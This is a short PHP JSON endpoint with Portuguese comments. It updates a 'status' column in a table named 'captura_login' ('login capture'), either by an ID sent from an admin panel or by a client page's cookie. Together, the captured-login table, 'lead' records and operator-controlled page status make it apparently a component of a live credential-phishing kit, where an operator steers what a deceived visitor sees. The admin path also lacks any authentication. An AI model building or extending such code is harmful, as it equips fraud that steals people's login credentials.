<?php
header('Content-Type: application/json');
require_once __DIR__ . '/db.php'; // Conexão com o banco

// 1. Pega os dados enviados pelo JavaScript
$data = json_decode(file_get_contents('php://input'), true);
$status = $data['status'] ?? null;
$lead_id_from_admin = $data['id'] ?? null; // ID enviado pelo Painel do Admin

if (empty($status)) {
    echo json_encode(['success' => false, 'error' => 'Status não fornecido.']);
    exit;
}

$sql = '';
$params = [];

// 2. Lógica "Inteligente": Verifica se o comando veio do Admin ou do Cliente
if ($lead_id_from_admin) {
    // --- CENÁRIO 1: COMANDO DO ADMIN ---
    // O admin enviou um ID específico para atualizar.
    $sql = "UPDATE captura_login SET status = ? WHERE id = ?";
    $params = [$status, $lead_id_from_admin];

} else {
    // --- CENÁRIO 2: "PING" DA PÁGINA DO CLIENTE ---
    // Nenhum ID foi enviado, então usamos o cookie do cliente.
    $session_id_from_client = $_COOKIE['identificador_cliente'] ?? null;
    
    if (!$session_id_from_client) {
        echo json_encode(['success' => false, 'error' => 'Sessão do cliente não encontrada.']);
        exit;
    }

    $sql = "UPDATE captura_login SET status = ? WHERE id = (
                SELECT id FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1
            )";
    $params = [$status, $session_id_from_client];
}

try {
    // 3. Executa a consulta SQL apropriada
    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);
    echo json_encode(['success' => true]);

} catch (PDOException $e) {
    // Em caso de erro, loga para depuração
    error_log('Erro na API de atualização de status: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Erro interno do servidor.']);
}
?>